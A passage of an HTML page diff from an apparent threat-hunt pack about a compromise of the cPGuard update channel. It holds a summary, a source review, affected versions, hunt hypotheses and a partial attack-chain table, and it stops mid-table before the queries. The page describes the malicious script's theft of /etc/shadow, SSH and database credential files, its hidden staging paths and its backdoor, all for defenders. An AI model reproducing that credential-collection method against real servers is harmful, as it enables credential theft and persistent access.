@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>cPGuard Update Channel Compromise (OPSSHIELD) — CrowdStrike CQL, SentinelOne PowerQuery and Defender XDR KQL Threat-Hunt Queries | HuntPack</title>
+<meta name="description" content="Ready-to-run hunt queries for cPGuard Update Channel Compromise (OPSSHIELD) in CrowdStrike LogScale (CQL), SentinelOne (PowerQuery) and Microsoft Defender XDR (KQL): MITRE ATT&amp;CK mapping, IOCs, detection and hardening.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://slapopotamus.github.io/HuntPack/hunts/cPGuard-OpsShield-SupplyChain-Hunt.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cPGuard Update Channel Compromise (OPSSHIELD) — CrowdStrike CQL, SentinelOne PowerQuery and Defender XDR KQL Threat-Hunt Queries | HuntPack">
+<meta property="og:description" content="Ready-to-run hunt queries for cPGuard Update Channel Compromise (OPSSHIELD) in CrowdStrike LogScale (CQL), SentinelOne (PowerQuery) and Microsoft Defender XDR (KQL): MITRE ATT&amp;CK mapping, IOCs, detection and hardening.">
+<meta property="og:url" content="https://slapopotamus.github.io/HuntPack/hunts/cPGuard-OpsShield-SupplyChain-Hunt.html">
+<meta name="twitter:card" content="summary">
+<meta name="description" content="Ready-to-run CrowdStrike LogScale (CQL) hunt queries for the cPGuard update channel compromise: malicious script, hidden backdoor shell, credential-file collection, MITRE ATT&amp;CK mapping, IOCs, detection and hardening.">
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --text: #e6edf3;
+  --text-muted: #8b949e;
+  --accent: #f778ba;                       /* THEME: swap per threat type */
+  --accent-dim: rgba(247,120,186,0.13);     /* THEME: same hue as --accent, ~0.13 alpha */
+  --red: #f85149; --yellow: #d29922; --green: #7ee787; --purple: #d2a8ff; --blue: #58a6ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
+
+/* Fixed LEFT sidebar TOC */
+#sidebar { position: fixed; top: 0; left: 0; width: 210px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; z-index: 100; transition: transform 0.2s ease; }
+.sidebar-logo { padding: 14px 14px 12px; border-bottom: 1px solid var(--border); }
+.sidebar-logo .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); font-weight: 700; }
+.sidebar-logo .pack-name { font-size: 12px; color: var(--text); font-weight: 600; margin-top: 3px; line-height: 1.3; }
+.sidebar-logo .version { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
+#sidebar nav { padding: 8px 0; }
+#sidebar nav a { display: block; padding: 4px 14px 4px 16px; color: var(--text-muted); text-decoration: none; font-size: 11.5px; border-left: 2px solid transparent; transition: all 0.12s; }
+#sidebar nav a:hover, #sidebar nav a.active { color: var(--accent); background: var(--accent-dim); border-left-color: var(--accent); }
+#sidebar nav .nav-section { padding: 10px 14px 3px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: #444d56; font-weight: 700; }
+
+/* Show/hide toggle */
+#toc-toggle { position: fixed; top: 10px; left: 172px; z-index: 200; background: var(--surface2); color: var(--accent); border: 1px solid var(--accent); border-radius: 5px; padding: 4px 9px; font-size: 13px; line-height: 1; cursor: pointer; transition: left 0.2s ease; font-family: inherit; }
+#toc-toggle:hover { background: var(--accent-dim); }
+#main { margin-left: 210px; padding: 24px 28px 80px; max-width: 1060px; transition: margin-left 0.2s ease; }
+body.toc-collapsed #sidebar { transform: translateX(-100%); }
+body.toc-collapsed #main { margin-left: 0; }
+body.toc-collapsed #toc-toggle { left: 10px; }
+@media (max-width: 768px) { #sidebar { transform: translateX(-100%); } #main { margin-left: 0; } #toc-toggle { left: 10px; } body.toc-shown #sidebar { transform: translateX(0); } }
+
+/* Header */
+.hp-header { background: linear-gradient(140deg, #2a1020 0%, var(--surface) 60%); border: 1px solid var(--accent); border-radius: 8px; padding: 22px 24px; margin-bottom: 24px; } /* THEME: tint the gradient start toward --accent */
+.hp-header h1 { font-size: 20px; color: var(--accent); font-weight: 700; letter-spacing: -0.01em; }
+.hp-header .subtitle { font-size: 12px; color: var(--text-muted); margin-top: 3px; margin-bottom: 14px; }
+.meta-grid { display: flex; flex-wrap: wrap; gap: 18px; }
+.meta-item .mk { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); }
+.meta-item .mv { font-size: 12px; color: var(--text); font-weight: 600; }
+
+/* Sections */
+.section { margin-bottom: 28px; scroll-margin-top: 16px; }
+.section-hdr { display: flex; align-items: center; gap: 8px; padding: 9px 14px; background: var(--surface); border: 1px solid var(--border); border-radius: 6px 6px 0 0; }
+.section-hdr h2 { font-size: 13px; font-weight: 600; color: var(--text); }
+.snum { font-size: 10px; color: var(--accent); font-weight: 700; background: var(--accent-dim); padding: 1px 6px; border-radius: 3px; }
+.section-body { background: var(--surface); border: 1px solid var(--border); border-top: none; border-radius: 0 0 6px 6px; padding: 16px; }
+
+/* Tables + badges */
+/* display:block + overflow-x makes a wide table scroll INSIDE its own box.
+   Without it a wide table pushes the whole document into horizontal scroll:
+   measured on a live pack, an 891px table in an 810px viewport gave the page a
+   1146px scroll width. With it the page stays at 810 and the table's full 891px
+   is still reachable by scrolling the table itself, so no column is lost. */
+table { width: 100%; border-collapse: collapse; font-size: 12px; display: block; overflow-x: auto; max-width: 100%; }
+th { background: var(--surface2); color: var(--text-muted); text-transform: uppercase; font-size: 9.5px; letter-spacing: 0.06em; padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; }
+td { padding: 6px 10px; border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--surface2); }
+.badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
+.b-high { background: rgba(248,81,73,0.18); color: #f85149; }
+.b-med { background: rgba(210,153,34,0.18); color: #d29922; }
+.b-low { background: rgba(126,231,135,0.18); color: #7ee787; }
+.b-crit { background: rgba(248,81,73,0.28); color: #ff7b72; border: 1px solid #f85149; }
+.b-info { background: rgba(88,166,255,0.15); color: #58a6ff; }
+.b-purple { background: rgba(210,168,255,0.15); color: #d2a8ff; }
+
+/* Query cards + cloud selector (CQL section) */
+.cloud-sel { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; padding: 7px 12px; background: var(--surface); border: 1px solid var(--accent); border-radius: 6px; font-size: 11px; margin-bottom: 14px; }
+.cloud-sel label { color: var(--text-muted); }
+.cloud-hint { color: var(--text-muted); flex: 1 1 240px; min-width: 0; }
+.cloud-sel select { background: var(--surface2); color: var(--text); border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px; font-size: 11px; cursor: pointer; font-family: inherit; }
+.query-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 14px; overflow: hidden; }
+.qc-header { display: flex; align-items: center; justify-content: space-between; padding: 9px 12px; background: var(--accent-dim); border-bottom: 1px solid var(--border); flex-wrap: wrap; gap: 8px; }
+.qc-title { font-size: 12.5px; font-weight: 600; color: var(--text); }
+.qc-badges { display: flex; gap: 5px; flex-wrap: wrap; }
+.qc-actions { display: flex; gap: 6px; }
+.qc-actions button { padding: 3px 9px; border-radius: 4px; font-size: 10.5px; font-weight: 600; cursor: pointer; border: 1px solid; transition: all 0.12s; font-family: inherit; }
+.btn-copy { background: var(--accent-dim); color: var(--accent); border-color: var(--accent); }
+.btn-copy.copied { background: rgba(126,231,135,0.18); color: #7ee787; border-color: #7ee787; }
+.btn-falcon { background: rgba(88,166,255,0.1); color: #58a6ff; border-color: rgba(88,166,255,0.5); }
+.btn-falcon:hover { background: rgba(88,166,255,0.22); }
+.qc-body { padding: 12px; }
+pre.cql { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Fira Code','Consolas',monospace; font-size: 11px; line-height: 1.55; overflow-x: auto; color: #e6edf3; }
+.cm { color: #8b949e; font-style: italic; }
+pre.code { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; line-height: 1.5; overflow-x: auto; color: #e6edf3; margin: 6px 0; white-space: pre; }
+
+/* IOC quick-copy grid, hardening tiers, callouts, changelog */
+.ioc-grab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(330px, 1fr)); gap: 12px; margin: 10px 0 18px; }
+.ioc-grab { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; }
+.ioc-grab .igh { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+.tier-blk { border: 1px solid var(--border); border-radius: 6px; padding: 11px 13px; margin-bottom: 10px; background: var(--surface2); }
+.tier-imm { border-left: 3px solid #f85149; } .tier-near { border-left: 3px solid #d29922; } .tier-strat { border-left: 3px solid #58a6ff; }
+.tier-lbl { font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px; }
+.tier-imm .tier-lbl { color: #f85149; } .tier-near .tier-lbl { color: #d29922; } .tier-strat .tier-lbl { color: #58a6ff; }
+.callout { display: block; padding: 9px 12px; border-radius: 5px; margin: 8px 0; font-size: 12px; line-height: 1.5; }
+.callout-warn { background: rgba(210,153,34,0.1); border: 1px solid rgba(210,153,34,0.35); color: #d29922; }
+.callout-info { background: rgba(88,166,255,0.09); border: 1px solid rgba(88,166,255,0.3); color: #58a6ff; }
+.callout-danger { background: rgba(248,81,73,0.09); border: 1px solid rgba(248,81,73,0.3); color: #f85149; }
+.chg-entry { display: flex; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+.chg-ver { color: var(--accent); min-width: 40px; font-weight: 700; } .chg-date { color: var(--text-muted); min-width: 88px; }
+p { margin-bottom: 7px; font-size: 13px; } ul, ol { padding-left: 18px; margin: 6px 0; } li { font-size: 12.5px; margin-bottom: 3px; }
+a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: underline; }
+h3 { font-size: 12.5px; font-weight: 700; margin: 13px 0 7px; color: var(--text); } h4 { font-size: 12px; font-weight: 600; margin: 9px 0 5px; color: var(--text-muted); }
+code { background: var(--surface2); border: 1px solid var(--border); border-radius: 3px; padding: 0 4px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; color: var(--accent); }
+
+.ticket { border: 1px solid var(--accent); border-radius: 6px; padding: 4px; background: var(--surface2); }
+.footer { color: var(--text-muted); font-size: 11px; padding: 8px 0; }
+
+#sidebar{scrollbar-width:none}#sidebar::-webkit-scrollbar{display:none}
+</style>
+<style id="rosetta-styles">
+.rosetta-query-shell{margin-top:.75rem}
+.rosetta-controls{display:flex;align-items:flex-end;justify-content:space-between;gap:.5rem;margin:10px 0 8px;border-bottom:1px solid var(--border,#30363d);padding-bottom:6px}
+.rosetta-tabs{display:flex;flex-wrap:wrap;gap:4px}
+.rosetta-tab{appearance:none;background:transparent;color:var(--text-muted,#8b949e);border:1px solid var(--border,#30363d);border-radius:4px;padding:4px 9px;font-family:inherit;font-size:10.5px;font-weight:600;line-height:1.2;cursor:pointer}
+.rosetta-tab:hover{color:var(--text,#e6edf3);border-color:var(--accent,#f97316)}
+.rosetta-tab[aria-selected="true"]{color:var(--accent,#f97316);background:var(--accent-dim,rgba(249,115,22,.1));border-color:var(--accent,#f97316)}
+.rosetta-tab:focus-visible,.rosetta-fallback-copy:focus-visible,.rosetta-readiness-copy:focus-visible{outline:3px solid var(--accent,#f59e0b);outline-offset:2px}
+.rosetta-pane[hidden]{display:none}
+.cloud-sel[hidden]{display:none}
+.rosetta-global{position:sticky;top:0;z-index:20;display:flex;flex-wrap:wrap;align-items:center;gap:6px 12px;margin:0 0 14px;padding:9px 12px;background:var(--surface,#161b22);border:1px solid var(--border,#30363d);border-radius:6px;box-shadow:0 6px 14px rgba(0,0,0,.35)}
+.rosetta-global-label{font-size:10.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text-muted,#8b949e)}
+.rosetta-global-btns{display:flex;flex-wrap:wrap;gap:6px}
+.rosetta-global-btn{appearance:none;background:transparent;color:var(--text-muted,#8b949e);border:1px solid var(--border,#30363d);border-radius:5px;padding:6px 13px;font-family:inherit;font-size:12px;font-weight:700;line-height:1.2;cursor:pointer}
+.rosetta-global-btn:hover{color:var(--text,#e6edf3);border-color:var(--accent,#f97316)}
+.rosetta-global-btn[aria-pressed="true"]{color:var(--bg,#0d1117);background:var(--accent,#f97316);border-color:var(--accent,#f97316)}
+.rosetta-global-btn:focus-visible{outline:3px solid var(--accent,#f59e0b);outline-offset:2px}
+.rosetta-global-mixed{font-size:10.5px;color:var(--text-muted,#8b949e)}
+.rosetta-global-mixed[hidden]{display:none}
+.rosetta-console{margin:0 0 14px;padding:10px 12px;border:1px solid rgba(56,139,253,.45);border-radius:6px;background:rgba(56,139,253,.07);color:var(--text-muted,#8b949e);font-size:12px}
+.rosetta-console[hidden]{display:none}
+.rosetta-console-row{display:flex;flex-wrap:wrap;align-items:center;gap:6px 10px}
+.rosetta-console label{color:var(--text,#e6edf3);font-weight:600}
+.rosetta-console input{flex:1 1 280px;min-width:0;background:var(--bg,#0d1117);color:var(--text,#e6edf3);border:1px solid var(--border,#30363d);border-radius:4px;padding:6px 9px;font:inherit;font-size:12px}
+.rosetta-console input[aria-invalid="true"]{border-color:#f85149}
+.rosetta-console input:focus-visible{outline:3px solid var(--accent,#f59e0b);outline-offset:2px}
+.rosetta-console-status{font-size:11px;color:var(--text-muted,#8b949e)}
+.rosetta-console-status.bad{color:#f85149}
+.rosetta-console-hint{margin:6px 0 0;font-size:11px;line-height:1.5}
+.rosetta-console select{flex:1 1 280px;min-width:0;background:var(--bg,#0d1117);color:var(--text,#e6edf3);border:1px solid var(--border,#30363d);border-radius:4px;padding:6px 9px;font:inherit;font-size:12px}
+.rosetta-console select:focus-visible{outline:3px solid var(--accent,#f59e0b);outline-offset:2px}
+.rosetta-open-s1,.rosetta-open-def{border:1px solid var(--accent,#f97316);border-radius:4px;background:transparent;color:var(--accent,#f97316);padding:3px 9px;cursor:pointer;font:inherit;font-size:10.5px;font-weight:600;white-space:nowrap}
+.rosetta-open-s1[hidden],.rosetta-open-def[hidden]{display:none}
+.rosetta-open-s1:hover,.rosetta-open-def:hover{background:var(--accent-dim,rgba(249,115,22,.1))}
+.rosetta-open-s1.done,.rosetta-open-def.done{color:#7ee787;border-color:#7ee787;background:rgba(126,231,135,.18)}
+.rosetta-open-s1:focus-visible,.rosetta-open-def:focus-visible{outline:3px solid var(--accent,#f59e0b);outline-offset:2px}
+.rosetta-controls-end{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.rosetta-fallback-copy{border:1px solid var(--accent,#f97316);border-radius:4px;background:var(--accent-dim,rgba(249,115,22,.1));color:var(--accent,#f97316);padding:3px 9px;cursor:pointer;font:inherit;font-size:10.5px;font-weight:600;white-space:nowrap}
+.rosetta-fallback-copy.copied{color:#7ee787;border-color:#7ee787;background:rgba(126,231,135,.18)}
+.query-card .rosetta-fallback-copy{display:none}
+.query-card .btn-falcon[hidden]{display:none}
+.rosetta-pane pre{max-width:100%;overflow:auto;white-space:pre}
+.rosetta-pane pre.siem-code{background:#010409;border:1px solid var(--border,#30363d);border-radius:4px;padding:10px 12px;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:11px;line-height:1.55;color:#e6edf3;margin:0}
+.rosetta-release{display:flex;flex-wrap:wrap;gap:5px;margin:8px 0;color:var(--text-muted,#8b949e);font-size:10px}
+.rosetta-badge{border:1px solid var(--border,#30363d);border-radius:999px;padding:2px 7px;background:rgba(110,118,129,.12)}
+.rosetta-badge.level{color:#7ee787;border-color:rgba(126,231,135,.45)}
+.rosetta-details{margin:0 0 8px;color:var(--text-muted,#8b949e);font-size:11px}
+.rosetta-details summary{cursor:pointer;color:var(--text,#e6edf3)}
+.rosetta-details ul{margin:6px 0 0 18px}
+.rosetta-requirements{margin:0 0 8px;border:1px solid var(--border,#30363d);border-radius:5px;background:rgba(110,118,129,.06);color:var(--text-muted,#8b949e);font-size:11px}
+.rosetta-requirements summary{cursor:pointer;padding:7px 9px;color:var(--text,#e6edf3);font-weight:600}
+.rosetta-requirements-body{padding:0 10px 10px;display:grid;gap:8px}
+.rosetta-requirements h4{margin:0 0 3px;color:var(--text,#e6edf3);font-size:11px}
+.rosetta-requirements ul{margin:0 0 0 18px;padding:0}
+.rosetta-requirements code{color:var(--accent,#f97316)}
+.rosetta-readiness-head{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:4px}
+.rosetta-readiness-copy{border:1px solid var(--accent,#f97316);border-radius:4px;background:transparent;color:var(--accent,#f97316);padding:3px 8px;cursor:pointer;font:inherit;font-size:10.5px;font-weight:600}
+.rosetta-readiness-code{background:#010409;border:1px solid var(--border,#30363d);border-radius:4px;padding:8px 10px;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:10.5px;line-height:1.5;color:#e6edf3;margin:0;max-width:100%;overflow:auto;white-space:pre}
+.rosetta-automated-validation{margin:0 0 8px;border:1px solid rgba(56,139,253,.45);border-radius:5px;background:rgba(56,139,253,.07);color:var(--text-muted,#8b949e);font-size:11px}
+.rosetta-automated-validation summary{cursor:pointer;padding:7px 9px;color:var(--text,#e6edf3);font-weight:600}
+.rosetta-automated-validation-body{padding:0 10px 9px;display:grid;gap:3px}
+.rosetta-automated-validation code{color:#79c0ff}
+.rosetta-automated-validation[data-status="failed"],.rosetta-automated-validation[data-status="fixture-failed"]{border-color:rgba(248,81,73,.55);background:rgba(248,81,73,.08)}
+.rosetta-publication{margin:14px 0;padding:12px 14px;border:1px solid rgba(249,115,22,.55);border-left:4px solid var(--accent,#f97316);border-radius:6px;background:rgba(249,115,22,.07);color:var(--text,#e6edf3);font-size:12px;line-height:1.5}
+.rosetta-publication-title{font-weight:700;margin-bottom:4px}
+.rosetta-publication-meta{color:var(--text-muted,#8b949e);font-size:11px;margin-bottom:5px}
+.rosetta-publication p{margin:0}
+@media(max-width:560px){.rosetta-global-btns{flex:1 1 100%}.rosetta-global-btn{flex:1 1 auto}.rosetta-tab{flex:1 1 auto}.rosetta-tabs{flex:1 1 100%}.rosetta-controls{align-items:stretch;flex-wrap:wrap}}
+</style>
+</head>
+<body>
+
+<button id="toc-toggle" onclick="toggleToc()" title="Show / hide table of contents" aria-label="Show or hide table of contents">&#9776;</button>
+
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="brand"><a href="https://slapopotamus.github.io/HuntPack/" style="color:inherit;text-decoration:none" title="HuntPack library, home">HUNTPACK</a></div>
+    <div class="pack-name">cPGuard Update Channel Compromise (OPSSHIELD)</div>
+    <div class="version">v0.1 &middot; 2026-11-04</div>
+  </div>
+  <nav>
+    <div class="nav-section">Overview</div>
+    <a href="#s1">1 &middot; Executive Summary</a>
+    <a href="#s2">2 &middot; Source Review</a>
+    <a href="#s3">3 &middot; Hunt Brief &amp; Chain</a>
+    <a href="#s4">4 &middot; IOC Table</a>
+    <a href="#s5">5 &middot; Affected Surface</a>
+    <a href="#s6">6 &middot; ATT&amp;CK Mapping</a>
+    <div class="nav-section">Detection</div>
+    <a href="#s7">7 &middot; Native Hunts</a>
+    <a href="#s8">8 &middot; SIEM Queries</a>
+    <a href="#s9" data-rosetta-original="9 &amp;middot; Custom IOA Recs">9 &middot; Detection Rules</a>
+    <a href="#s10">10 &middot; IOC Appendix</a>
+    <a href="#s11">11 &middot; Validation Gates</a>
+    <div class="nav-section">Response</div>
+    <a href="#s12">12 &middot; Hardening</a>
+    <a href="#s13">13 &middot; Playbooks</a>
+    <a href="#s14">14 &middot; Containment</a>
+    <div class="nav-section">Meta</div>
+    <a href="#s15">15 &middot; Coverage Map</a>
+    <a href="#s16">16 &middot; Hunt Ticket</a>
+    <a href="#s17">17 &middot; Changelog</a>
+    <a href="#s18">18 &middot; References</a>
+  </nav>
+</nav>
+
+<div id="main">
+  <div class="hp-header">
+    <h1>cPGuard Update Channel Compromise (OPSSHIELD)</h1>
+    <div class="subtitle">Malicious script pushed through the legitimate auto-update channel of a Linux server security product &middot; credential files collected and uploaded to the vendor's licensing server &middot; hidden backdoor shell left &middot; no actor or malware name assigned by any source</div>
+    <div class="meta-grid">
+      <div class="meta-item"><div class="mk">Threat</div><div class="mv">cPGuard versions 5.88.12 through 5.88.19 (fixed in 5.88.25 or later)</div></div>
+      <div class="meta-item"><div class="mk">Severity</div><div class="mv"><span class="badge b-high">HIGH</span></div></div>
+      <div class="meta-item"><div class="mk">Type</div><div class="mv">Supply chain / credential theft / backdoor (Linux)</div></div>
+      <div class="meta-item"><div class="mk">Access</div><div class="mv">Compromised credentials on the vendor update CDN, 2026-11-02 02:06 UTC; no vulnerability exploited</div></div>
+      <div class="meta-item"><div class="mk">Scale</div><div class="mv">Vendor: 32 retrieved files (floor). BleepingComputer: 2,946 servers (single-sourced)</div></div>
+      <div class="meta-item"><div class="mk">Version</div><div class="mv">v0.1 &middot; 2026-11-04</div></div>
+      <div class="meta-item"><div class="mk">Author</div><div class="mv">HuntPack</div></div>
+      <div class="meta-item"><div class="mk">Confidence</div><div class="mv">High on mechanism and the four named artifacts (vendor-published); low on scale and upload details</div></div>
+    </div>
+  </div>
+
+
+  <div class="section" id="s1">
+    <div class="section-hdr"><span class="snum">01</span><h2>Executive Summary</h2></div>
+    <div class="section-body">
+<p><strong>What happened.</strong> On 2 November 2026 at 02:06 UTC an unidentified attacker used compromised credentials to reach the update distribution infrastructure (CDN) of OPSSHIELD, the maker of cPGuard, a server security product for cPanel and Linux hosting servers. The attacker used that access to push a malicious script through the legitimate auto-update channel in cPGuard versions 5.88.12 through 5.88.19. OPSSHIELD says it detected the attack within 12 hours, secured the compromised account, cleared its infrastructure credentials and stopped further distribution. How the credentials were obtained is still under investigation.</p>
+<p><strong>What the script does.</strong> Per the vendor, it collected <code>/etc/shadow</code> and <code>/etc/passwd</code>, root's MariaDB/MySQL configuration (<code>my.cnf</code>), root's shell history and root's SSH authorization and known-hosts files, staged them in a hidden directory under <code>/var/tmp</code>, uploaded them to OPSSHIELD's own licensing server under a compromised account for the attacker to retrieve later, and left a backdoor shell. OPSSHIELD confirmed the attacker retrieved some of that data and estimates 32 collected files, each tied to one customer server. This is a preliminary count of confirmed retrieval, not the number of affected servers.</p>
+<p class="callout callout-info"><strong>Scale, stated plainly.</strong> BleepingComputer reports that an OPSSHIELD spokesperson said 2,946 servers were affected and that a billing system database was also copied. Neither figure appears in the vendor advisory, The Hacker News or SecurityOnline, so both are single-sourced here and are not used by any query. The BleepingComputer snapshot is also a model-generated extraction, not a verbatim copy (see Section 2).</p>
+<p class="callout callout-warn"><strong>Correction to a common summary.</strong> Some coverage says the script took "root SSH keys". The vendor's list is root's SSH <em>authorization and known-hosts</em> files. Private keys under <code>/root/.ssh</code> appear only in the vendor's rotation advice ("replace SSH private keys stored under /root/.ssh"), as a precaution. Rotate them anyway, but do not report private-key theft as confirmed.</p>
+<p><strong>Highest-value defensive angle.</strong> The product is the delivery vehicle, so a clean version number today proves nothing: the vendor says a server that installed an affected update must be treated as potentially compromised even if it now runs 5.88.25 or later, because credentials copied before cleanup may still work. Run the <code>install_log</code> check, hunt the named hidden paths and the credential-sweep and upload behavior, then rotate credentials. The vendor does not recommend a routine rebuild; it may if you find other signs of compromise.</p>
+<p class="callout callout-danger"><strong>Defender priority:</strong> on every cPGuard server run <code>grep 'Successfully updated' /opt/cpguard/logs/install_log</code>; any entry from 5.88.12 to 5.88.19 means treat the host as compromised. Update with <code>cpgcli update --start</code>, confirm 5.88.25 or later with <code>cpgcli --version</code>, then reset root and every password-enabled local account from a trusted environment and rotate database passwords, S3 keys, DigitalOcean tokens, secrets in root's shell history and the SSH private keys under <code>/root/.ssh</code>.</p>
+    </div>
+  </div>
+
+  <div class="section" id="s2">
+    <div class="section-hdr"><span class="snum">02</span><h2>Source Review &amp; Web Hunter Notes</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Tier</th><th>Source</th><th>Key Finding</th><th>Carry Forward</th></tr>
+<tr><td>1</td><td>OPSSHIELD: cPGuard security advisory, update channel compromise (published 2026-11-03)</td><td>Vendor timeline, affected range, collected data, install_log check, the four named artifacts, fix version, remediation, 32-file estimate</td><td><span class="badge b-low">yes</span></td></tr>
+<tr><td>2</td><td>The Hacker News (2026-11-03)</td><td>Independent write-up of the advisory; adds that the support-access feature places an OPSSHIELD public key in root's authorized_keys and that exposure of the matching private key is not stated</td><td><span class="badge b-low">yes</span></td></tr>
+<tr><td>2</td><td>SecurityOnline (Daily CyberSecurity)</td><td>Corroborates the date, versions, hidden folder under /var/tmp and backdoor path. Says "root SSH keys" loosely (see Section 1)</td><td><span class="badge b-med">partial</span></td></tr>
+<tr><td>2</td><td>BleepingComputer (2026-11-03)</td><td>Only source for the 2,946-server figure and the billing database claim. Direct fetch was blocked (HTTP 403); the snapshot is a WebFetch extraction, not verbatim</td><td><span class="badge b-med">partial</span></td></tr>
+</table>
+<h3>Decisions and conflicts</h3>
+<ul>
+<li><strong>Artifacts.</strong> All four atomic artifacts (script name, backdoor shell, collection directory, loot archive) were verified by hand against the saved vendor snapshot and The Hacker News snapshot. The backdoor shell path is also in the SecurityOnline snapshot. The Hacker News derives its list from the vendor, so these are not independent sources: every artifact ships as <strong>detect</strong>, never prevent.</li>
+<li><strong>No hashes, IPs or malicious domains</strong> were published by any source. None are invented; the Falcon CSV carries labelled <code>REPLACE_WITH_</code> placeholders.</li>
+<li><strong>Versions are not IOCs.</strong> 5.88.12 through 5.88.19 (affected) and 5.88.25 (fixed) live in prose and the version table only. Versions 5.88.20 to 5.88.24 are described by no source as either affected or fixed.</li>
+<li><strong>Time zone.</strong> The vendor's example <code>install_log</code> lines use a day-first date (<code>02-11-2026 02:46:04</code>) with no stated zone; do not assume UTC.</li>
+<li><strong>Unpublished:</strong> the upload hostname and method, the update process names, how the script is launched, whether the backdoor shell is a script or a binary, and whether the support-access private key was exposed.</li>
+<li><strong>Scale conflict.</strong> The vendor's "32 files" is retrieval from its licensing server and one extraction of the BleepingComputer text garbles it as "from each customer". Treat 32 as a confirmed floor, not a scope.</li>
+<li><strong>Injected instructions.</strong> No fetched page contained text directing an AI agent to act. Nothing was dropped on that ground.</li>
+<li><strong>Naming.</strong> No source assigns an actor, campaign or malware name. The pack uses only "cPGuard" and "OPSSHIELD".</li>
+</ul>
+    </div>
+  </div>
+
+  <div class="section" id="s3">
+    <div class="section-hdr"><span class="snum">03</span><h2>Hunt Brief &amp; Attack Chain</h2></div>
+    <div class="section-body">
+<h3>Affected and fixed versions (not IOCs)</h3>
+<table>
+<tr><th>Item</th><th>Value</th><th>Source</th></tr>
+<tr><td>Affected updates</td><td>cPGuard 5.88.12 through 5.88.19, inclusive</td><td>OPSSHIELD advisory; The Hacker News</td></tr>
+<tr><td>Fixed</td><td>5.88.25 or later (removes the known backdoor and staged files)</td><td>OPSSHIELD advisory</td></tr>
+<tr><td>Unknown</td><td>5.88.20 to 5.88.24: no source says affected or fixed. Update to 5.88.25 or later</td><td>Gap</td></tr>
+<tr><td>Window</td><td>Access gained 2026-11-02 02:06 UTC; detected within 12 hours</td><td>OPSSHIELD advisory</td></tr>
+</table>
+<h3>Hunt hypotheses</h3>
+<table>
+<tr><th>#</th><th>Hypothesis</th><th>Query</th><th>Confidence</th></tr>
+<tr><td>H1</td><td>The malicious script ran on the host: its filename appears on a command line</td><td>Q1</td><td><span class="badge b-low">High</span></td></tr>
+<tr><td>H2</td><td>The hidden backdoor shell or collection directory exists and was executed or written</td><td>Q2, Q3</td><td><span class="badge b-low">High</span></td></tr>
+<tr><td>H3</td><td>Root credential files were swept by one parent process</td><td>Q4</td><td><span class="badge b-med">Medium</span></td></tr>
+<tr><td>H4</td><td>The loot archive was built and uploaded</td><td>Q5, Q6, Q7</td><td><span class="badge b-med">Medium</span></td></tr>
+<tr><td>H5</td><td>The host updated through the affected range (scoping)</td><td>Q8 plus the Section 7 install_log check</td><td><span class="badge b-med">Medium</span></td></tr>
+</table>
+<h3>Attack chain</h3>
+<table>
+<tr><th>Step</th><th>Behavior</th><th>Telemetry</th><th>Hunt Angle</th></tr>
+<tr><td>1</td><td>Attacker uses compromised credentials on the vendor CDN and publishes the script in the update channel</td><td>None on your side: vendor infrastructure</td><td>Not huntable; confirm affected versions with install_log</td></tr>
+<tr><td>2</td><td>Server's scheduled update check installs 5.88.12 to 5.88.19 and runs the script</td><td>Process creation with command line and parent (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents); product log on disk</td><td>Q1, Q8; install_log check</td></tr>
+<tr><td>3</td><td>Script reads shadow, passwd, root SSH files, my.cnf and shell history</td><td>Process creation with command line (same as step 2). Shell-builtin reads leave no event</td><td>Q4</td></tr>
+<tr><td>4</td><td>Files staged in /var/tmp/.cpg91511 and archived to loot.tgz</td><td>Process creation with command line; executable or file written (CrowdStrike: ElfFileWritten for executables)</td><td>Q2, Q3, Q5</td></tr>
+<tr><td>5</td><td>Archive uploaded to the OPSSHIELD licensing server under a compromised account</td><td>Process creation with command line; DNS lookup with the requesting process (CrowdStrike: DnsRequest. SentinelOne: DNS Resolved. Defender: DeviceEvents DnsQueryResponse); outbound network connection</td><td>Q6, Q7</td></tr>
